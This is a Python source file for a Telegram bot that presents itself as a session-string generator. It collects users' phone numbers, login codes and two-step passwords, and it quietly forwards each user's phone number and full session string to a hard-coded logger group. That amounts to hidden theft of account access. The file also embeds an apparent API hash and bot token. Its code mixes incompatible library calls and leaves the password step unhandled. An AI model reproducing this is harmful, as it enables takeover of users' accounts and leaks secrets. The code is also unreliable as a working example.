import asyncio
from pyrogram.errors import PhoneCodeExpired, PhoneCodeInvalid, SessionPasswordNeeded
from pyrogram.types import Message
from pyrogram import Client, filters, StringSession
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup



# Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"

# Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706

# Initialize the bot
bot = Client("bot", API_ID, API_HASH, bot_token=BOT_TOKEN)

# Store user sessions
user_sessions = {}

# Start Command with Image & Buttons
@bot.on_message(filters.command("start"))
async def start(client, message: Message):
    await message.reply(
        "┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★\n"
        "**┆◍ нᴇʏ, ᴍʏ ᴅᴇᴀʀ ᴜsᴇʀ 💐!\n"
        "┆● ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ !\n"
        "└─────────────────────────•\n"
        "❖ ɪ ᴀᴍ ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴇ ʙᴏᴛ**\n"
        "❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ**\n"
        "❖ sᴜᴘᴘᴏʀᴛ - ᴘʏʀᴏɢʀᴀᴍ | ᴛᴇʟᴇᴛʜᴏɴ\n"
        "•─────────────────────────•\n"
        "❖ ʙʏ : sᴀɴᴀᴛᴀɴɪ ᴛᴇᴄʜ | sᴀɴᴀᴛᴀɴɪ ᴄʜᴀᴛ\n"
        "•─────────────────────────•", 
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🍁 ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ 🍁", callback_data="generate")],
            [InlineKeyboardButton("🍷 sᴜᴘᴘᴏʀᴛ", url="https://t.me/SANATANI_SUPPORT"), 
             InlineKeyboardButton("ᴜᴘᴅᴀᴛᴇs 🍸", url="https://t.me/SANATANI_TECH")],
            [InlineKeyboardButton("🔍 ʜᴇʟᴘ ᴍᴇɴᴜ 🔎", callback_data="help")]
        ])
    )


# Help Command Handler
@bot.on_callback_query(filters.regex(b"help"))
async def send_help(client, callback_query):
    help_text = """ 
    ❖ ʜᴏᴡ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ?

    ◍ ᴄʟɪᴄᴋ ᴏɴ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ ᴏʀ ᴛʏᴘᴇ /generate
    ◍ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ, • ᴇxᴀᴍᴘʟᴇ : +919876543210 
    ◍ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ
    ◍ ɪғ ᴀsᴋᴇᴅ, ᴇɴᴛᴇʀ ʏᴏᴜʀ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ
    ◍ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ !
    ◍ ᴋᴇᴇᴘ ʏᴏᴜʀ session sᴀғᴇ & sᴇᴄᴜʀᴇ. ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ

    ❖ ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴜsᴇ /cancel ᴛᴏ ʀᴇsᴇᴛ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ
    """
    await callback_query.message.reply(help_text, reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back", callback_data="start")]
    ]))


# Cancel Command Handler
@bot.on_message(filters.command("cancel"))
async def cancel_command(client, message: Message):
    await cancel_session(client, message)


# Cancel Button Handler
@bot.on_callback_query(filters.regex(b"cancel"))
async def cancel_button(client, callback_query):
    await cancel_session(client, callback_query.message)


# Function to Cancel the Process
async def cancel_session(client, message: Message):
    user_id = message.from_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]  # Remove user session
        await message.reply("❖ ʏᴏᴜʀ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss ʜᴀs ʙᴇᴇɴ ᴄᴀɴᴄᴇʟᴇᴅ !\n◍ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀɢᴀɪɴ ᴡɪᴛʜ /generate")
    else:
        await message.reply("❖ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ ᴀɴʏ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss")


# Generate Session Command
@bot.on_callback_query(filters.regex(b"generate"))
async def ask_phone(client, callback_query):
    user_id = callback_query.from_user.id
    user_sessions[user_id] = {"step": "phone"}
    await callback_query.message.reply(
        "❖ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n\n◍ ᴇxᴘʟᴀɪɴ :** +919876543210**", 
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
        ])
    )


# Process User Input
@bot.on_message(filters.text)
async def process_input(client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone":
        phone_number = message.text.strip()
        user_sessions[user_id]["phone"] = phone_number

        async with Client(StringSession(), API_ID, API_HASH) as client_session:
            user_sessions[user_id]["client"] = client_session

            try:
                sent_code = await client_session.send_code_request(phone_number)
                user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
                user_sessions[user_id]["step"] = "otp"
                await message.reply(
                    "**❖ ᴏᴛᴘ sᴇɴᴛ ! ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ !**",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
                    ])
                )
            except Exception as e:
                await message.reply(f"**❖ ᴇʀʀᴏʀ:** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ !")
                del user_sessions[user_id]

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  # Retrieve hash

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n**◍ ᴘʜᴏɴᴇ:** `{phone_number}`\n**◍ sᴇssɪᴏɴ:** `{session_string}`")

            await message.reply(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n❖ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
            del user_sessions[user_id]

        except PhoneCodeExpired:
            await message.reply("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ʜᴀs ᴇxᴘɪʀᴇᴅ. ᴘʟᴇᴀsᴇ ᴜsᴇ /generate ᴛᴏ ɢᴇᴛ ᴀ ɴᴇᴡ ᴏᴛᴘ**")
            del user_sessions[user_id]

        except PhoneCodeInvalid:
            await message.reply("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ**")

        except SessionPasswordNeeded:
            user_sessions[user_id]["step"] = "password"
            await message.reply(
                "**❖ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.**\n◍ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴘᴀssᴡᴏʀᴅ :",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
                ])
            )

        except Exception as e:
            await message.reply(f"**❖ ᴇʀʀᴏʀ :** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")
            del user_sessions[user_id]

# Running the Bot
bot.run()
